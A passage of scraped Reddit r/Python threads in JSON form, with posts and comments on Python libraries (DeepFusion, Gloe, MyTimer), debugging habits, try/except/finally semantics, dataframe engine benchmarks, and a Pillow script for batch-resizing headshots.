    "post_content": "What My Project Does:\nHello all, I am a student at Stanford University, I was on a gap year due to medical conditions and to utilitze my time I was studying deep learning.\nAnd Voila...\nI've developed a deep learning library, DeepFusion!\nDetails:\nIt's customizable and has an easily accessible and highly intuitive codebase. One can just dive right in and effortlessly understand the source code.\nYou can download it from:\ngithub at https://github.com/atharvaaalok/deepfusion\nor install using pip install deepfusion (easy!)\nFor a series of examples explaining the usage and features refer demo or tutorials.\nTarget Audience:\nMachine learning and python enthusiasts.\nComparison:\nDeepFusion allows explicit access to all activations in a neural network, therefore, making applications such as neural style transfer much easier to perform. It also provides an easy user interface for forward and backward pass profiling, multiple loss functions, automated training, gpu training etc.",
    "comments": [
        {
            "author": "orestaras",
            "score": "2",
            "content": "It is amazing!",
            "replies": [
                {
                    "author": "atharvaaalok1",
                    "score": "2",
                    "content": "This is the motivation I needed ! Thanks!!!"
                }
            ]
        }
    ]
},
{
    "post_author": "RavenHustlerX",
    "post_id": "koat5n",
    "post_score": "2318",
    "post_time": "Friday, January 1, 2021 at 3:50:31 PM GMT+3",
    "flair_text": "Resource",
    "post_title": "Spent 9hrs finding a bug yesterday, took 15mins to figure it out today",
    "media": [],
    "post_content": "I spent the whole day finding a bug yesterday, couldn't find it at the end of the day and got a headache due to stress. Woke up today and found the bug 15 mins after.\nWorrying about the delay in the project fogged my mind and I couldn't think logically, blind to different possibilities.\nTaking a break and having a clear mind is very important. This has happened to me a couple of times so decided to post this here today to remember not to repeat this ever lol.\nEdit: Thanks for the award kind stranger. I thought this was more of a personal problem, reading all the comments I'm happy to know I'm not alone. I feel more normal now 🙂.",
    "comments": [
        {
            "author": "vorticalbox",
            "score": "512",
            "content": "I have this too, if I'm super stuck I'll go for a walk or do the washing up. I've fixed some major bugs at work while washing dishes.",
            "replies": [
                {
                    "author": "dcpye",
                    "score": "115",
                    "content": "Happened today while taking a shower, its amazing how we are blocked by our own mind."
                },
                {
                    "author": "BeginningGuava",
                    "score": "12",
                    "content": "theory is your brain works on it in the background, lots of famous people had techniques they used to do this. Some go on walks, others would take short naps, \"shower thoughts\" is the more commonly used term"
                }
            ]
        },
        {
            "author": "sparttann",
            "score": "140",
            "content": "Yup taking a break is Super important. You should also consider saying your thought process to someone else, or talk to a rubber ducky!",
            "replies": [
                {
                    "author": "tree_or_up",
                    "score": "41",
                    "content": "For those who haven't encountered the rubber duck analogy: https://en.wikipedia.org/wiki/Rubber_duck_debugging"
                },
                {
                    "author": "bobspadger",
                    "score": "14",
                    "content": "This is an incredibly important skill to master"
                },
                {
                    "author": "EnemyPigeon",
                    "score": "12",
                    "content": "https://www.thingiverse.com/thing:575924/apps This is what I use as my rubber ducky."
                }
            ]
        },
        {
            "author": "zFoux37",
            "score": "54",
            "content": "A tired mind is the worst enemy of any programmer. If you can't think straight, your chances of making mistakes or insist in a flawed logic increases significantly. Take a nap, walk the dogo, play something, whatever you want to clear your thoughts from the problem, than come back at it with a refreshed mind. Works 99.9% of the time",
            "replies": [
                {
                    "author": "bw_mutley",
                    "score": "10",
                    "content": "\"... play something,...\" as long as it is not a life taker game like Factorio."
                }
            ]
        },
        {
            "author": "nathanjell",
            "score": "39",
            "content": "Also remember that it's all about ROI. Let's say you're using your product, and you realize you've found a bug. Not something show-stopping: a clear but, but something low priority. What do you do? Do you spend ten hours on it today, trying to figure out your replication steps and the root cause? Or, after a half hour, do you just log the issue in your issue tracker with as much info as you can, and come back to it later? Where is your finite time best spent? We often get stuck in this mindset of \"all bugs are critical, I found it and I need to immediately solve it\". But ask any product owner or project manager: it's usually acceptable to know that a minor bug exists if that means that time is better spent on something else. Typically this would be scheduled as part of a release project (whether it be release, patch, etc) to tackle a few bugs at the same time."
        }
    ]
},
{
    "post_author": "young-and-ignorant",
    "post_id": "1cx0dh4",
    "post_score": "85",
    "post_time": "Tuesday, May 21, 2024 at 8:27:41 AM GMT+3",
    "flair_text": "Discussion",
    "post_title": "try... except... finally!",
    "media": [],
    "post_content": "Haven't seen this syntax used very often and was wondering why. During error handling, if you have something to run independent of the success, you can use finally.\nfrom your_library import DataProcess\n\n\nengine = DataProcess()\n\ntry:\n    engine.io()\n    engine.process()\n    engine.some_more_io()\nexcept Exception as e:\n    engine.revert()\n    raise e\nfinally:\n    engine.cleanup()\nVS\nfrom your_library import DataProcess\n\n\nengine = DataProcess()\n\ntry:\n    engine.io()\n    engine.process()\n    engine.some_more_io()\nexcept Exception as e:\n    engine.revert()\n    engine.cleanup()\n    raise e\nengine.cleanup()\nVS\nfrom your_library import DataProcess\nfrom contextlib import contextmanager\n\n\n@contextmanager\ndef process_data(engine: DataProcess):\n    try:\n        engine.io()\n        yield engine\n    except Exception as e:\n        engine.revert()\n        raise e\n    finally:\n        engine.cleanup()\n\nproc = DataProcess()\nwith process_data(proc) as engine:\n    engine.process()\n    engine.some_more_io()",
    "comments": [
        {
            "author": "ThatSituation9908",
            "score": "64",
            "content": "In your example, having finally is more proper. The other comment about using context manager is better. Context manager is largely why it's rare to need finally. There aren't many cases where you have a command that must run in BOTH try and except cases. A lot of the time, except is handled by raising another error or exiting early. It's rare to see because most people don't know it. There's also try...except...else...finally.",
            "replies": [
                {
                    "author": "Frosty-Blackberry-98",
                    "score": "2",
                    "content": "Yeah, I feel like I’m the only one that actually uses else for code blocks (for and while loops also support it). It’s very useful when you want to do some operation on the last iteration of a loop while still having access to the context variables only accessible within the loop."
                },
                {
                    "author": "SpecialistInevitable",
                    "score": "-3",
                    "content": "And else is for when try didn't execute because of some condition that wasn't met, but not because of an error right?",
                    "replies": [
                        {
                            "author": "jmpjanny",
                            "score": "29",
                            "content": "The else block is executed when the try block was successful."
                        },
                        {
                            "author": "cheerycheshire",
                            "score": "13",
                            "content": "Else is run as basically continuation of the try. It goes \"try doing A\", \"except if error X happens, do B\" (<- see the implicit \"if\" here), \"else do C\". Try part should only have the code that throws. Having too much code in the try could make you catch stuff you don't want or just make analysing the code hard (because someone would need to think which line can throw). \"Except\" statements catch errors, they don't need to break out of the thing. They may be used to try fetching a value in another way or something. But then, the except that continues the thing may not need to do other stuff! So without the \"else\" part, it would either be too much stuff in the \"try\" or setting and checking flags to see whether \"try\" was run fully without the \"except\"."
                        }
                    ]
                }
            ]
        },
        {
            "author": "hp-derpy",
            "score": "70",
            "content": "context managers and the with statement is used to separate the resource management from the exception handling. see also: https://docs.python.org/3/library/contextlib.html",
            "replies": [
                {
                    "author": "Sarius2009",
                    "score": "11",
                    "content": "Tho this has the disadvantage of not making obvious what happens when exiting and having no control over it, e.g. multi threading Pool calls terminate instead of close() and join() which imo would be more common and intuitive."
                }
            ]
        },
        {
            "author": "pepoluan",
            "score": "10",
            "content": "#2 is against DRY principle. If engine.cleanup() must be called anyways, why repeat it in both the exception handler and continuation code? Wrapping in a @contextmanager is good, but sometimes that adds more mental load as the context manager is far away. So it's either #1 or #3 for me, depending on how complex the .cleanup() procedure is."
        },
        {
            "author": "yaxriifgyn",
            "score": "14",
            "content": "The finally block is executed when you leave the try and except blocks. So, if you or Python leaves those blocks by a return statement, an exit function call, or by any exception, whether caught or not, the code in the finally block will be executed. E.g. f = None try: f = open(...) # write to file finally: if f: # finish writing to file f.close()"
        },
        {
            "author": "divad1196",
            "score": "6",
            "content": "Finally is always run, even before a return statement in the \"try\" or the \"except\" statement. This has a totally different meaning and is meant for something that always need to run once you put a toe in the try block. This is why the contextmanager actually work. Except block is only for error handling. Things after these blocks are just the rest of the flow which might never be reached. I have personnaly seen \"finally\" too much instead of \"except\" for so many bad reasons."
        },
        {
            "author": "menge101",
            "score": "6",
            "content": "Fixing up code blocks from top post: One: from your_library import DataProcess engine = DataProcess() try: engine.io() engine.process() engine.some_more_io() except Exception as e: engine.revert() raise e finally: engine.cleanup() Two: from your_library import DataProcess engine = DataProcess() try: engine.io() engine.process() engine.some_more_io() except Exception as e: engine.revert() engine.cleanup() raise e engine.cleanup() Three: from your_library import DataProcess from contextlib import contextmanager @contextmanager def process_data(engine: DataProcess): try: engine.io() yield engine except Exception as e: engine.revert() raise e finally: engine.cleanup() proc = DataProcess() with process_data(proc) as engine: engine.process() engine.some_more_io()"
        },
        {
            "author": "ztmq",
            "score": "7",
            "content": "For anyone who sees this comment: try: execute code except: handle error else: no exceptions? Run this code finally: always run this code"
        },
        {
            "author": "BuonaparteII",
            "score": "5",
            "content": "finally is very handy in situations where you need it--but more often C-style try: except: else: is what you need"
        },
        {
            "author": "Rythoka",
            "score": "3",
            "content": "Huge caveat with try-finally blocks - if you return inside of a finally block, then that value will be returned, even if the finally block is triggered by the function returning a value elsewhere. >>> def f(): ...    try: ...        return True ...    finally: ...        return False ... >>> f() False"
        }
    ]
},
{
    "post_author": "justme_sam",
    "post_id": "1d200hx",
    "post_score": "30",
    "post_time": "Monday, May 27, 2024 at 10:35:48 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Gloe: A lightweight lib to create readable and type-safe pipelines",
    "media": [
        "https://gloe.ideos.com.br/getting-started/transformers.html",
        "https://gloe.ideos.com.br/getting-started/async-transformers.html#async-pipelines",
        "https://gloe.ideos.com.br/getting-started/main-concepts.html",
        "http://github.com/ideos/gloe",
        "https://gloe.ideos.com.br/getting-started/plotting.html",
        "https://gloe.ideos.com.br/#example",
        "https://gloe.ideos.com.br/"
    ],
    "post_content": "Have you ever faced a moment when your code is a mess of nested classes and functions, and you have to dig through dozens of levels to understand a simple function?\nGloe (pronounced like “glow”) is a library designed to assist you organize your code into a type-safe flow, making it flat and linear.\nWhat My Project Does\nHere’s what it can do for you:\nWrite type-safe pipelines with pure Python.\nExpress your code as a set of atomic and extensible units of responsibility called transformers.\nValidate the input and output of transformers, and changes between them during execution.\nMix sync and async code without worrying about its concurrent nature.\nKeep your code readable and maintainable, even for complex flows.\nVisualize you pipelines and the data flowing through them.\nUse it anywhere without changing your existing workflow.\nTarget Audience: any Python developer who sees their code as a flow (a series of sequential operations) and wants to improve its readability and maintainability. It's production-ready!\nComparison: Currently, unlike platforms like Air Flow that include scheduler backends for task orchestration, Gloe’s primary purpose is to aid in development. The graph structure aims to make the code more flat and readable.\nExample of usage in a server:\nsend_promotion = (\n    get_users >> (\n        filter_basic_subscription >> send_basic_subscription_promotion_email,\n        filter_premium_subscription >> send_premium_subscription_promotion_email,\n    ) >>\n    log_emails_result\n)\n\n@users_router.post('/send-promotion/{role}')\ndef send_promotion_emails_route(role: str):\n    return send_promotion(role)\nFull code.\nLinks:\ngithub.com/ideos/gloe gloe.ideos.com.br",
    "comments": [
        {
            "author": "nekokattt",
            "score": "4",
            "content": "so basically what streams/reactive streams provide in other languages? Or are you intending for it to be more like a content based router?",
            "replies": [
                {
                    "author": "justme_sam",
                    "score": "1",
                    "content": "The router example is just one simple use case. In this case, Gloe is used to control the delivered content, but you can create flows in any other context, even outside of a server. For instance, you can use it in a standalone data processing script. Actually, you can implement the pieces of a flow and connect them however you want.",
                    "replies": [
                        {
                            "author": "nekokattt",
                            "score": "2",
                            "content": "cool so effectively like a reactive stream in Java then? return serverRequest .bodyToMono(EmailRequest.class) .map(request -> request.isPremium() ? createPremiumEmailRequestFrom(request) : createBasicEmailRequestFrom(request) .doOnNext(this::logEmailRequest) .flatMap(this::sendEmailRequest) .timeout(ofSeconds(30)) .then(ServerResponse.noContent());",
                            "replies": [
                                {
                                    "author": "justme_sam",
                                    "score": "2",
                                    "content": "It is similar but without the publish–subscribe stuff. The idea is to compose functions to apply transformations. The composed transformers (C = A >> B) are just other transformers that can be composed as well (E = C >> D). And you can call any transformer like a function (A(arg), C(arg) or E(arg)). Using this approach, you can create complex flows where each piece is atomic, isolated, and has an explicit interface. Python typing, with the help of Mypy, ensures that you cannot compose transformers with inappropriate interfaces."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "ExdigguserPies",
            "score": "3",
            "content": "Does it play well with things like pydantic?",
            "replies": [
                {
                    "author": "justme_sam",
                    "score": "1",
                    "content": "For sure! The data flowing through the transformers can be of any complex type, including Pydantic models. We are working on more concrete examples and can add one with Pydantic ;)."
                }
            ]
        }
    ]
},
{
    "post_author": "Chemomechanics",
    "post_id": "e1ldoz",
    "post_score": "2217",
    "post_time": "Monday, November 25, 2019 at 10:41:33 PM GMT+3",
    "flair_text": "",
    "post_title": "A fitting curve that \"boings\" into place (and a digression into spring-mass-dampers, vibration and control theory, and integral transforms)",
    "media": [],
    "post_content": "",
    "comments": [
        {
            "author": "Plungerdz",
            "score": "332",
            "content": "I absolutely adore how insanely overkill this approach to smooth motion is."
        },
        {
            "author": "Chemomechanics",
            "score": "179",
            "content": "Code is described to make graphic objects \"boing\" into place in an underdamped oscillatory style. To derive the appropriate equation for this dynamic behavior, spring-mass-damper systems are analyzed, including constitutive equations obtained from a free-body diagram, the Laplace transform to solve differential equations, and various types of loading and initial conditions. Time-domain and frequency-domain responses are surveyed, as are a few key concepts in vibration and control theory such as resonance and transfer functions.",
            "replies": [
                {
                    "author": "rrajen",
                    "score": "10",
                    "content": "Fabulous write-up! Are the equations courtesy of Mathjax? What about the spring-mass-damper gif animations? how did you generate them?"
                },
                {
                    "author": "antiproton",
                    "score": "-85",
                    "content": "",
                    "replies": [
                        {
                            "author": "Synes_Godt_Om",
                            "score": "63",
                            "content": "While I totally agree from a purely professional perspective, this is fun and people are bound to like it."
                        },
                        {
                            "author": "PsychedSy",
                            "score": "29",
                            "content": "I can see its use in describing certain fitting methods to non-technical types. Administrators love animated shit."
                        },
                        {
                            "author": "workw0rkworkwork",
                            "score": "25",
                            "content": "Because it is fun ya dingus"
                        }
                    ]
                },
                {
                    "author": "Greyhat101",
                    "score": "-22",
                    "content": "",
                    "replies": [
                        {
                            "author": "ArgetDota",
                            "score": "28",
                            "content": "You know, math is usually involved in anything that must make sense."
                        },
                        {
                            "author": "Calvert4096",
                            "score": "8",
                            "content": "Do you dislike screwdrivers? Math is a tool, just like Python is a tool. I can understand disliking a task, but disliking a tool (unless it's in favor of another) doesn't make a lot of sense."
                        }
                    ]
                }
            ]
        },
        {
            "author": "d1tatermasher",
            "score": "75",
            "content": "I like the \"boing\""
        },
        {
            "author": "fail_daily",
            "score": "60",
            "content": "Why did you stop at the cubic fit??? I need mooooooooorrrreee"
        },
        {
            "author": "dietolead",
            "score": "19",
            "content": "I can hear it."
        },
        {
            "author": "Rian352",
            "score": "7",
            "content": "Here I am, struggling to make a password checker...."
        },
        {
            "author": "troyunrau",
            "score": "38",
            "content": "It looks like you're optimizing for linear distance, but using a curve that isn't parametric. This is likely a bad fit to your data. Go down a rabbit hole on the subject of \"principal curves\". It will allow you to fit a parametric curve instead. I use it for fitting smooth curves to GPS points, for example, when trying to define where a road is based on individual GPS points from multiple different trips down the same road."
        },
        {
            "author": "mdcpanama22",
            "score": "4",
            "content": "This is mesmerizing and spectacular"
        },
        {
            "author": "[deleted]",
            "score": "6",
            "content": "This is pretty awesome."
        }
    ]
},
{
    "post_author": "mrocklin",
    "post_id": "1cyqj6c",
    "post_score": "75",
    "post_time": "Thursday, May 23, 2024 at 2:30:31 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "TPC-H Cloud Benchmarks: Spark, Dask, DuckDB, Polars",
    "media": [
        "https://docs.coiled.io/blog/tpch.html",
        "https://github.com/coiled/benchmarks/tree/main/tests/tpch"
    ],
    "post_content": "I hit publish on a blogpost last week on running Spark, Dask, DuckDB, and Polars on the TPC-H benchmark across a variety of scales (10 GiB, 100 GiB, 1 TiB, 10 TiB), both locally on a Macbook Pro and on the cloud.  It’s a broad set of configurations.  The results are interesting.\nNo project wins uniformly.  They all perform differently at different scales: \nDuckDB and Polars are crazy fast on local machines\nDask and DuckDB seem to win on cloud and at scale\nDask ends up being most robust, especially at scale\nDuckDB does shockingly well on large datasets on a single large machine\nSpark performs oddly poorly, despite being the standard choice 😢\nTons of charts in this post to try to make sense of the data.  If folks are curious, here’s the post:\nhttps://docs.coiled.io/blog/tpch.html\nAnd here's the code. Performance isn’t everything of course.  Each project has its die-hard fans/critics for loads of different reasons. I'd be curious to hear if people want to defend/critique their project of choice.",
    "comments": [
        {
            "author": "mrocklin",
            "score": "8",
            "content": "Oh, my colleague also recently wrote this post on how he and his team made Dask fast.https://docs.coiled.io/blog/dask-dataframe-is-fast.html",
            "replies": [
                {
                    "author": "ritchie46",
                    "score": "18",
                    "content": "Hey Matt, Are these numbers on Polars still the`polars-streaming` engine and not our default engine? For context to readers. Our `streaming` engine is still in beta and not our default choice. The performance characteristics and correctness of our default engine are quite different. We see our `streaming` engine as being in beta. Currently, it is being completely redesigned to address known shortcomings.",
                    "replies": [
                        {
                            "author": "mrocklin",
                            "score": "5",
                            "content": "Yes, they are still the polars-streaming engine. There are disclaimers in the blogpost specifying this going out shortly. My apologies on the delay here. Our plan is not to use the default engine because for the most part it doesn't complete queries in these hardware configurations (we can do this though if you prefer). This is a case, I think, where different biases in hardware selection can cause dramatically different benchmark results.",
                            "replies": [
                                {
                                    "author": "ritchie46",
                                    "score": "11",
                                    "content": "Our plan is not to use the default engine because for the most part it doesn't complete queries in these hardware configurations (we can do this though if you prefer). Yes, I'd prefer that. We are designed to do well on the in-memory use case and our default engine is our best engine for that case. We aren't happy with the streaming engine that's why we completely redesign it atm."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "PurepointDog",
            "score": "5",
            "content": "I'm excited to see benchmarks that don't use the polars streaming engine, or that show both! My understanding was that Polars wins on performance nearly everywhere, short of clustering",
            "replies": [
                {
                    "author": "mista-sparkle",
                    "score": "1",
                    "content": "Polars with a on performance What does this mean? Did you mean to say “wiffs”, i.e., performs poorly?"
                }
            ]
        },
        {
            "author": "awntbaj",
            "score": "1",
            "content": "\"Spark locally on a Macbook Pro\". Interesting."
        },
        {
            "author": "madness_of_the_order",
            "score": "2",
            "content": "It would be interesting to see arrow ballista alongside those"
        }
    ]
},
{
    "post_author": "sepandhaghighi",
    "post_id": "1cz2uyd",
    "post_score": "9",
    "post_time": "Thursday, May 23, 2024 at 11:30:10 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "MyTimer v1.3: A Geeky Timer for Terminal Enthusiasts",
    "media": [
        "https://github.com/sepandhaghighi/mytimer",
        "https://github.com/sobrinojulian/timer-cli",
        "https://github.com/antonmedv/countdown"
    ],
    "post_content": "GitHub Repo: https://github.com/sepandhaghighi/mytimer\nWhat My Project Does:\nMyTimer is a Python CLI project that provides a simple, efficient timer for terminal users, particularly targeting the geek community. It allows users to set timers directly from their command line interface, offering a distraction-free experience.\nmytimer --hour=12 --minute=34 --second=56 --alarm --alarm-repeat=5\n\n ___    ______          ______   _     _         _______  _______   \n(___)  (_____ \\        (_____ \\ | |   (_)       (_______)(_______)  \n   _     ____) )   _    _____) )| |_____    _    ______   ______    \n  | |   / ____/   (_)  (_____ ( |_____  |  (_)  (_____ \\ |  ___ \\   \n _| |_ | (_____    _    _____) )      | |   _    _____) )| |___) )  \n(_____)|_______)  (_)  (______/       |_|  (_)  (______/ |______/   \nTarget Audience:\nDevelopers who spend a significant amount of time working in the terminal :)\nComparison:\nMyTimer supports more features compared to countdown\nMyTimer offers a greater variety of faces and functions than timer-cli",
    "comments": []
},
{
    "post_author": "vaiv101",
    "post_id": "dhs74f",
    "post_score": "2317",
    "post_time": "Monday, October 14, 2019 at 6:31:57 PM GMT+3",
    "flair_text": "",
    "post_title": "When Python Meets Fourier Transform",
    "media": [
        "https://external-preview.redd.it/xamHHTu-dKJedn7v6RJdMyOrjQ0FepNQC-1ajY1XJjw.png?width=640&crop=smart&format=pjpg&auto=webp&s=f1c81867362b3c7fe74432a8bea83f92c5524024"
    ],
    "post_content": "",
    "comments": [
        {
            "author": "w8cycle",
            "score": "429",
            "content": "Looks like a \"furrier\" transformation 😉",
            "replies": [
                {
                    "author": "Mooks79",
                    "score": "14",
                    "content": "I had to paws to understand that.",
                    "replies": [
                        {
                            "author": "conventionistG",
                            "score": "5",
                            "content": "Cat got your tongue?"
                        }
                    ]
                },
                {
                    "author": "Cosmic_Sands",
                    "score": "60",
                    "content": "owo"
                }
            ]
        },
        {
            "author": "nielsrolf",
            "score": "58",
            "content": "You need help understanding the complex Fourier Transform? Ask OP. Need some support with Python? OP knows. Improve your data visualization skills? OP is your guy. Take a screen video? Hm that's hard"
        },
        {
            "author": "__unavailable__",
            "score": "74",
            "content": "That's a surprisingly intuitive way of depicting fourier series."
        },
        {
            "author": "Todask",
            "score": "29",
            "content": "Is this code published?"
        },
        {
            "author": "qevlarr",
            "score": "24",
            "content": "Someone watched 3blue1brown"
        },
        {
            "author": "a5myth",
            "score": "8",
            "content": "You know how we have two main types of graphic programs, raster (pixel) and vector (lines with addresses and directions, etc), would it be possible to create a graphics program that uses fourier series calculations instead?"
        },
        {
            "author": "augle",
            "score": "6",
            "content": "Pretty cool. Where can I find more info on this, or can you briefly explain how that was done?"
        },
        {
            "author": "[deleted]",
            "score": "4",
            "content": "is it possible to inverse the circle order? Big one spinning around?"
        },
        {
            "author": "log_2",
            "score": "4",
            "content": "This doesn't look right. There are moments when the biggest circle speeds up. All circles should be rotating at a constant speed, because changing speed changes frequency and each circle is meant to represent one constant frequency."
        }
    ]
},
{
    "post_author": "ThePawners",
    "post_id": "1d1uemr",
    "post_score": "30",
    "post_time": "Monday, May 27, 2024 at 6:39:43 PM GMT+3",
    "flair_text": "Showcase",
    "post_title": "Book Management Restful-API",
    "media": [
        "https://www.instagram.com/nordszamora",
        "https://bookscollection.pythonanywhere.com/api/v1/books",
        "https://www.tiktok.com/@nordszamora",
        "https://github.com/nordszamora/Book-Management-API",
        "https://github.com/nordszamora",
        "https://www.threads.net/@nordszamora"
    ],
    "post_content": "What My Project Does:\nThis project aims to provide a simple and efficient way to manage a collection of books through various API endpoints.\nThis API allows you to:\nGet a list of all books.\nAdd a new book.\nGet a book by its isbn.\nUpdate an existing book by its isbn.\nDelete a book by its isbn.\nAPI Endpoints:\nGET /api/v1/books - Retrieve all books.\nPOST /api/v1/books - Add a new book.\nGET /api/v1/books/<ISBN> - Retrieve a book by its ISBN.\nPUT /api/v1/books/<ISBN> - Update a book by its ISBN.\nDELETE /api/v1/books/<ISBN> - Delete a book by its ISBN.\nTarget Audience:\nAnyone who is interested to integrate book management api into their applications.\nWebsite API: Book Management API\nGitHub Repo: Book-Management-API on GitHub\nFollow Me:\nIG: @nordszamora\nThreads: @nordszamora\nTiktok: @nordszamora\nGithub: @nordszamora",
    "comments": [
        {
            "author": "kerry_gold_butter",
            "score": "27",
            "content": "Congrats on the project but perhaps not the place to post it. I think someone has trolled you. Made a GET request for all books and heres a snippet of what was returned. {'author': 'Banana Man', 'genre': 'BANANAS GONE WILD PUBLISHING', 'id': 1, 'isbn': 9780061120084, 'price': -99, 'publisher': 'Banana Publishing', 'quantity': 50, 'title': 'Why are bananas yellow?', 'year': -1990} {'author': 'Banana Man', 'genre': 'BANANAS GONE WILD PUBLISHING', 'id': 2, 'isbn': 9780452284234, 'price': -99, 'publisher': 'Banana Publishing', 'quantity': 30, 'title': 'Why are bananas yellow?', 'year': -1990} I guess that's a lesson on what can happen if there is no security on your routes...",
            "replies": [
                {
                    "author": "PM_YOUR_FEET_PLEASE",
                    "score": "-5",
                    "content": "",
                    "replies": [
                        {
                            "author": "kerry_gold_butter",
                            "score": "13",
                            "content": "Yes, not doubting it is working and its a great little project for sure. Just saying someone has turned all OPs books into Why are bananas yellow by Banana Man.",
                            "replies": [
                                {
                                    "author": "PM_YOUR_FEET_PLEASE",
                                    "score": "0",
                                    "content": "They have indeed. 😂 But it proves the API works."
                                }
                            ]
                        },
                        {
                            "author": "Inkosum",
                            "score": "2",
                            "content": "Does it? Can a price and year be negative? Can a book have the same title, same author, same price, same year yet different ISBN?",
                            "replies": [
                                {
                                    "author": "PM_YOUR_FEET_PLEASE",
                                    "score": "1",
                                    "content": "Obviously it can. As that is what has happened. This APl allows you to: Get a list of all books. Add a new book. Get a book by its isbn. Update an existing book by its isbn. Delete a book by its isbn. It works."
                                }
                            ]
                        }
                    ]
                }
            ]
        },
        {
            "author": "ikmalsaid",
            "score": "8",
            "content": "This project has gone bananas!"
        },
        {
            "author": "riklaunim",
            "score": "8",
            "content": "You are lacking schema for serialization/deserialization and validation (Marshmallow for example). List/update logic should not be next to each other - usually there is some repository level for such logic while the view is just the switch. Then the usual - testing, database migrations, authentication layer. You got a basic flask starter app that needs bit more work.",
            "replies": [
                {
                    "author": "Ran4",
                    "score": "7",
                    "content": "List/update logic should not be next to each other - usually there is some repository level for such logic while the view is just the switch. That's absolutely not needed for something like this. The repository pattern is just one pattern, it's not one that has to always be used."
                }
            ]
        },
        {
            "author": "Informal_Trash7066",
            "score": "1",
            "content": "I was workibg in something similar, great work"
        }
    ]
},
{
    "post_author": "autokitteh",
    "post_id": "1cxbyf6",
    "post_score": "9",
    "post_time": "Tuesday, May 21, 2024 at 7:24:12 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Durable Python - Infrastructure failures should not stop the process ",
    "media": [],
    "post_content": "Durable Python enables developers to write Python code while an underlying system ensures reliability and resilience.\nIt automatically handles state persistence, fault tolerance, and retry mechanisms, allowing developers to focus on business logic without worrying about infrastructure concerns.\nConsider the following code, in case the process terminates in the middle of execution, in case the process is killed or due to hardware failure, the process will not complete.\nimport requests\nimport time\n\n\nSLEEP_SECONDS = 3\nURL = \"http://localhost:9980/webtools/api/msgs\"\n\ndef on_http_get(data):\n    for i in range(10):\n        print(\"Loop iteration: %d of 10\" % (i + 1))\n\n        # Send a POST request to the application\n        requests.post(URL, data = \"This is my \" + str(i) + \" iteration...\")\n        time.sleep(SLEEP_SECONDS)\nBut actually, I would like the process to survive restarts and continue from the spot it terminated, especially if it's a long running process. For this we need Durable Python.\nI was wondering which use cases can take advantage of this technology.",
    "comments": [
        {
            "author": "[deleted]",
            "score": "",
            "content": "Sounds like a cool feature to work on, but I'm not sure I could ever trust partially compiled output from an app that departed normal operation based on my experience with various compilers over the years.",
            "replies": [
                {
                    "author": "rocket_randall",
                    "score": "1",
                    "content": "Sounds like a cool feature to work on, but I'm not sure I could ever trust partially compiled output from an app that departed normal operation based on my experience with various compilers over the years."
                },
                {
                    "author": "HaimZlatokrilov",
                    "score": "-13",
                    "content": ""
                }
            ]
        },
        {
            "author": "FailedPlansOfMars",
            "score": "36",
            "content": "You dont want durable code. Simple solution below: 1, Store state outside the process, a file will do. 2, update file after each post. 3, run as service in the os with restarts. 4, dont catch errors. This way you can update the code, restart the service easy, restart/ replace the server. Scale by moving the file to a db and run multiple instances. No need for code level handling of this at all."
        },
        {
            "author": "Ddog78",
            "score": "15",
            "content": "It's an infra problem, not a python problem. Hell, the simplest solution is to create a bash script that runs your code, monitors the process id, and when it fails, restarts your code. There's data you need to save? Use sqllite."
        },
        {
            "author": "Miclivs",
            "score": "11",
            "content": "This is what Temporal is for"
        },
        {
            "author": "redditusername58",
            "score": "11",
            "content": "This is the shittiest stealth advertising I've ever seen",
            "replies": [
                {
                    "author": "PlaysForDays",
                    "score": "6",
                    "content": "For real, they didn't even bother to use two usernames that aren't associated with their typo-laden startup The least somebody could do when trying to astroturf is not do so from an account named after the founder of the startup who is OP"
                }
            ]
        },
        {
            "author": "Grouchy-Friend4235",
            "score": "7",
            "content": "You want restart ability, no t durability. Restart ability means you checkpoint work and restart from the last checkpoint. To ensure replays are possible, make operations idempotent (same operation = same outcome)."
        },
        {
            "author": "DogeDrivenDesign",
            "score": "3",
            "content": "erlang/otp and elixir"
        },
        {
            "author": "gooeydumpling",
            "score": "1",
            "content": "You mean like Erlang and it’s supervisor tree -Within a supervisor tree, all supervisor processes are responsible for managing the lifecycle of their child processes, and this includes handling situations in which those child processes crash."
        }
    ]
},
{
    "post_author": "[deleted]",
    "post_id": "mca9u2",
    "post_score": "2208",
    "post_time": "Wednesday, March 24, 2021 at 7:39:10 PM GMT+3",
    "flair_text": "Discussion",
    "post_title": "Python made me look like a WIZARD",
    "media": [],
    "post_content": "Today in work a request comes in for 745 headshots that need to be processed to fit 150x150px for an external platform. One team says it'll take them at least a week to do, the other team says they don't want it as it'll take even longer.\n\"They need them all black and white! It'll take some time to convert them! They're not even all the same size! UGH this just can't be done in the 2 days they've requested this!!!\"\n12 lines of code, the Pillow library and exactly 8.856 seconds of running said code... It was done. Panic over. Client happy.\nI work in a design team but I'm a job coordinator (so I sort the jobs and make sure the right designers get them). They were amazed it was done so quickly without using Photoshop.\nThey asked how. I gave them the answer.\nPython baby 😎\nEDIT\nFor those wanting to know the code, here it is:\nfrom PIL import Image\nimport os\n\nfor f in os.listdir('Input'):\n    if f.endswith('.jpg'):\n        im = Image.new('RGB', (150, 150), (255,255,255))\n        im2 = Image.open('Input/{}'.format(f))\n        im2 = im2.convert(\"L\")\n        width, height = im2.size\n        im.paste(im2, (int((150 - width) / 2), 0))\n        fn, fext = os.path.splitext(f)\n        im.save('Output/{}.jpg'.format(fn))\nThe images given were either 150x150 already (but in colour) or 120x150. So had to cover all bases with this. If it could be made more efficient, let me know!",
    "comments": [
        {
            "author": "apt_at_it",
            "score": "730",
            "content": "This would also be pretty trivially easy to do using Photoshop bulk actions, just in case your coworkers are more designers than coders 😜",
            "replies": [
                {
                    "author": "[deleted]",
                    "score": "296",
                    "content": "they don't really like automation that much - they fear it will put them out of work! But I guess they'll have embrace it for the mundane jobs like this",
                    "replies": [
                        {
                            "author": "cbunn81",
                            "score": "334",
                            "content": "Better they do the automation themselves rather than wait around for clients to leave for another company that uses automation.",
                            "replies": [
                                {
                                    "author": "_its_a_SWEATER_",
                                    "score": "44",
                                    "content": "Code for designers!"
                                },
                                {
                                    "author": "XecutionerNJ",
                                    "score": "9",
